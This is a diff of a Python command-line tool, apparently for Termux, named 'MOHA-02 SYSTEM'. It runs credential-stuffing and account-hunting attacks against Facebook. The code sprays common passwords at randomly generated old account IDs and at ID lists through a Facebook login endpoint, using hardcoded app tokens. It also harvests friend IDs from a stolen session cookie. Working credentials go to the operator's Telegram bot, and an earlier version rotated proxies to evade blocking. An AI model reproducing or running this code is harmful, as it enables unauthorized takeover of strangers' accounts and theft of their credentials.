@@ -1,139 +1,160 @@
 # -*- coding: utf-8 -*-
-import os, sys, time, requests, random, uuid, threading, json
+# --------------------------------------------------------
+# Tool Name: MOHA-02 SYSTEM (Ultimate Edition)
+# Developer: Moha Al-Shalfawi (@m_oha_02)
+# Version: 4.5 (2026)
+# --------------------------------------------------------
+
+import os, sys, time, requests, random, uuid, threading
 from concurrent.futures import ThreadPoolExecutor
 
-# --- Cyber Neon Color Matrix ---
-Z = '\033[1;31m'      # Red (Errors)
-F = '\033[1;32m'      # Green (Success)
-X = '\033[1;33m'      # Yellow (Warnings/Notes)
-B = '\033[1;34m'      # Blue (Main)
-P = '\033[1;35m'      # Purple (Decorative)
-C = '\033[1;36m'      # Cyan (Inputs)
-W = '\033[1;37m'      # White
-G = '\033[1;90m'      # Gray (Details)
+# --- مصفوفة الألوان المتناسقة ---
+G = '\033[1;32m' # أخضر (للعناوين والنجاح)
+R = '\033[1;31m' # أحمر (للحظر)
+Y = '\033[1;33m' # أصفر (للتنبيهات)
+B = '\033[1;34m' # أزرق (لمدخلات التوكن والآيدي)
+P = '\033[1;35m' # بنفسجي (لمدخلات الأرقام والسنوات)
+C = '\033[1;36m' # سماوي (للخيارات)
+W = '\033[1;37m' # أبيض
 
 hits, cp, bad = 0, 0, 0
-proxy_list = []
+stop_check = False
 
 def logo():
     os.system('clear')
-    # شعار بتنسيق ألوان متدرج (Cyberpunk Style)
     print(f"""
 {B}   __  __  ____  _   _    _      ___ ____  
 {B}  |  \/  |/ __ \| | | |  / \    / _ \___ \ 
-{C}  | |\/| | |  | | |_| | / _ \  | | | |__) |
-{C}  | |  | | |__| |  _  |/ ___ \ | |_| / __/ 
-{P}  |_|  |_|\____/|_| |_/_/   \_\ \___/_____|
-{P}       SYSTEM V3.6 - BY MOHA AL-SHALFAWI
-{G}--------------------------------------------------
-{W}  [+] Dev   : {C}@m_oha_02
-{W}  [+] Status: {F}Premium Edition
-{G}--------------------------------------------------""")
+{P}  | |\/| | |  | | |_| | / _ \  | | | |__) |
+{P}  | |  | | |__| |  _  |/ ___ \ | |_| / __/ 
+{G}  |_|  |_|\____/|_| |_/_/   \_\ \___/_____|
+{G}       SYSTEM V4.5 - BY MOHA AL-SHALFAWI
+{Y}--------------------------------------------------""")
 
-def check_connection(token, chat_id):
-    """فحص إذا كان البوت شغال والطلبات تصل"""
-    print(f"{X}[*] Testing Connection...")
-    url = f"https://api.telegram.org/bot{token}/getMe"
-    try:
-        res = requests.get(url, timeout=10).json()
-        if res.get("ok"):
-            print(f"{F}[+] Connection Verified! Requests are reaching the bot.")
-            return True
-        else:
-            print(f"{Z}[!] Error: Bot Token is Invalid or Blocked!")
-            return False
-    except:
-        print(f"{Z}[!] Connection Failed: Check your Internet/VPN.")
-        return False
+def join_channel():
+    logo()
+    print(f"{Y}[!] يجب الاشتراك في القناة لتشغيل الأداة...")
+    time.sleep(2)
+    os.system("termux-open-url https://t.me/m_oha0_2b")
+    print(f"{G}[+] تم فتح القناة. يمكنك الآن استخدام الأداة.")
+    time.sleep(2)
 
-def fetch_proxies():
-    global proxy_list
-    print(f"{C}[*] Rotating Proxies to Bypass Security...")
-    try:
-        res = requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all').text
-        proxy_list = res.splitlines()
-        print(f"{F}[+] Loaded {len(proxy_list)} Active Proxies.")
-    except:
-        print(f"{X}[!] Proxy Server Busy, using Direct IP.")
+def login_fb(user, pw, chat_id, bot_token):
+    global hits, cp, bad, stop_check
+    if stop_check: return
 
-def login_fb(email, pw, chat_id=None, bot_token=None):
-    global hits, cp, bad
     ua = "Dalvik/2.1.0 (Linux; U; Android 11; RMX3263) [FBAN/FB4A;FBAV/450.0.0.45.109;]"
-    proxy = {"http": random.choice(proxy_list)} if proxy_list else None
-    
     url = "https://b-graph.facebook.com/auth/login"
     data = {
-        "email": email, "password": pw,
+        "email": user, "password": pw,
         "access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
         "api_key": "882a8490361da98702bf97a021ddc14d",
-        "method": "auth.login", "format": "json", "device_id": str(uuid.uuid4())
+        "method": "auth.login", "format": "json"
     }
     
     try:
-        res = requests.post(url, data=data, headers={"User-Agent": ua}, proxies=proxy, timeout=7).json()
+        res = requests.post(url, data=data, headers={"User-Agent": ua}, timeout=10).json()
         if "session_key" in res:
             hits += 1
-            print(f"\r{F}[HIT] {email} | {pw} | {res.get('access_token')[:15]}...")
-            if bot_token and chat_id:
-                msg = f"✅ MOHA HIT!\nUser: {email}\nPass: {pw}\nType: Old Account"
-                requests.post(f"https://api.telegram.org/bot{bot_token}/sendMessage", data={'chat_id':chat_id, 'text':msg})
-            open("hits.txt", "a").write(f"{email}:{pw}\n")
+            print(f"\r{G}[MOHA-HIT] {user} | {pw}                     ")
+            requests.post(f"https://api.telegram.org/bot{bot_token}/sendMessage?chat_id={chat_id}&text=🔥 MOHA HIT!\nUser: {user}\nPass: {pw}")
         elif "www.facebook.com" in str(res):
             cp += 1
-            print(f"\r{X}[CP] {email} | {pw}                      ")
+            print(f"\r{Y}[MOHA-CP] {user} | {pw}                      ")
+        elif "Calls to this api have exceeded" in str(res) or "403" in str(res):
+            stop_check = True
+            print(f"\n{R}[!] محظور من الفحص! شغل وضع الطيران ثم عد.")
         else:
             bad += 1
-            sys.stdout.write(f"\r{G}[Checking] {hits}/{cp}/{bad} | {W}{email[:15]} "); sys.stdout.flush()
-    except Exception as e:
-        # إذا كان البروكسي محظور أو توقف
-        pass
+            sys.stdout.write(f"\r{W}[Checking] {hits}/{cp}/{bad} | {user[:10]}..."); sys.stdout.flush()
+    except: pass
 
-def tool_old_accounts():
+# --- 1. أداة سحب الآيديات (المطورة) ---
+def tool_extract():
     logo()
-    print(f"{P}--- Target Selection ---")
-    print(f"{B}[1] 2004-2005 (Rare IDs)")
-    print(f"{B}[2] 2009 (Old Series)")
-    print(f"{B}[3] 2010-2012 (Mid Series)")
-    print(f"{B}[4] 2013-2014 (New Series)")
-    print(f"{Z}[0] Back")
+    cookie = input(f"{G}[+] Enter Cookie: {B}")
+    file_name = input(f"{G}[+] Enter File Name to Save: {B}")
+    limit = int(input(f"{G}[+] How Many IDs to Extract?: {P}"))
     
-    choice = input(f"\n{C}MOHA-YEAR > ")
-    if choice == '0': return
+    print(f"{Y}[*] جاري السحب... انتظر")
+    try:
+        # كود استخراج الآيديات من الأصدقاء
+        headers = {"cookie": cookie}
+        token_res = requests.get("https://business.facebook.com/business_locations", headers=headers).text
+        token = "EAAG" + token_res.split('EAAG')[1].split('"')[0]
+        
+        friends = requests.get(f"https://graph.facebook.com/me/friends?access_token={token}", headers=headers).json()
+        with open(file_name, "w") as f:
+            count = 0
+            for person in friends.get('data', []):
+                if count >= limit: break
+                f.write(f"{person['id']}|{person['name']}\n")
+                count += 1
+        print(f"{G}[+] تم الحفظ في {file_name} بنجاح.")
+    except: print(f"{R}[!] فشل السحب. تأكد من الكوكيز.")
+    time.sleep(2)
 
-    token = input(f"{W}[+] Bot Token: ")
-    chat_id = input(f"{W}[+] Chat ID  : ")
+# --- 2. أداة فحص الملف (يدوي) ---
+def tool_check_file():
+    global stop_check
+    stop_check = False
+    logo()
+    file_path = input(f"{G}[+] Enter ID File Path: {B}")
+    bot_token = input(f"{G}[+] Enter Bot Token: {B}")
+    chat_id = input(f"{G}[+] Enter Chat ID: {B}")
     
-    # التحقق من الاتصال قبل البدء
-    if not check_connection(token, chat_id):
-        input(f"{X}Press Enter to try anyway...")
+    num_pass = int(input(f"{G}[+] How many passwords per ID?: {P}"))
+    custom_passes = [input(f"{C}  └─ Password {i+1}: {B}") for i in range(num_pass)]
+        
+    try:
+        users = open(file_path, "r").read().splitlines()
+        print(f"{Y}[*] بدأ الفحص... للوقف Ctrl+C")
+        with ThreadPoolExecutor(max_workers=35) as pool:
+            for line in users:
+                if stop_check: break
+                uid = line.split('|')[0] if '|' in line else line
+                for pw in custom_passes:
+                    pool.submit(login_fb, uid, pw, chat_id, bot_token)
+    except: print(f"{R}[!] الملف غير موجود!")
+    time.sleep(2)
 
-    fetch_proxies()
-    passwords = ['123456', '1234567', '12345678', '123123', '321321', '123456789']
+# --- 3. أداة صيد قديم (مثالي) ---
+def tool_old_hunting():
+    global stop_check
+    stop_check = False
+    logo()
+    print(f"{C}[1] {W}2004-2005 {C}[2] {W}2009 {C}[3] {W}2010-2012 {C}[4] {W}2013-2014")
+    year = input(f"\n{G}[+] اختر السنة: {P}")
+    bot_token = input(f"{G}[+] Enter Bot Token: {B}")
+    chat_id = input(f"{G}[+] Enter Chat ID: {B}")
     
-    print(f"{F}[*] Engine Started... Hunting in progress.")
+    passwords = ['123456', '1234567', '12345678', '123456789', '123123', '321321', 'password']
+    
+    print(f"{Y}[*] بدأ صيد الحسابات القديمة...")
     with ThreadPoolExecutor(max_workers=35) as pool:
-        while True:
-            if choice == '1': uid = str(random.randint(100000, 99000000))
-            elif choice == '2': uid = "1000000" + str(random.randint(10000, 99999))
-            elif choice == '3': uid = "100001" + str(random.randint(100000, 999999))
-            elif choice == '4': uid = "100005" + str(random.randint(100000, 999999))
+        while not stop_check:
+            if year == '1': uid = str(random.randint(100000, 99000000))
+            elif year == '2': uid = "1000000" + str(random.randint(10000, 99999))
+            elif year == '3': uid = "100001" + str(random.randint(100000, 999999))
+            elif year == '4': uid = "100005" + str(random.randint(100000, 999999))
             else: break
+            for pw in passwords: pool.submit(login_fb, uid, pw, chat_id, bot_token)
 
-            for pw in passwords:
-                pool.submit(login_fb, uid, pw, chat_id, token)
-
+# --- القائمة الرئيسية ---
 def main():
+    join_channel()
     while True:
         logo()
-        print(f"{B}[1] Start Hunting (Old Accounts)")
-        print(f"{B}[2] ID Extractor")
-        print(f"{B}[3] File Checker")
-        print(f"{Z}[0] Exit")
+        print(f"{C}[1] {W}سحب آيديات (كوكيز -> ملف)")
+        print(f"{C}[2] {W}فحص ملف آيديات (كلمات سر يدوية)")
+        print(f"{C}[3] {W}صيد حسابات قديمة (سنوات محددة)")
+        print(f"{R}[0] {W}خروج")
         
-        choice = input(f"\n{C}MOHA-02 > ")
-        if choice == '1': tool_old_accounts()
+        choice = input(f"\n{G}MOHA-02 > {P}")
+        if choice == '1': tool_extract()
+        elif choice == '2': tool_check_file()
+        elif choice == '3': tool_old_hunting()
         elif choice == '0': sys.exit()
-        else: print(f"{Z}Invalid Selection"); time.sleep(1)
 
 if __name__ == "__main__":
     main()
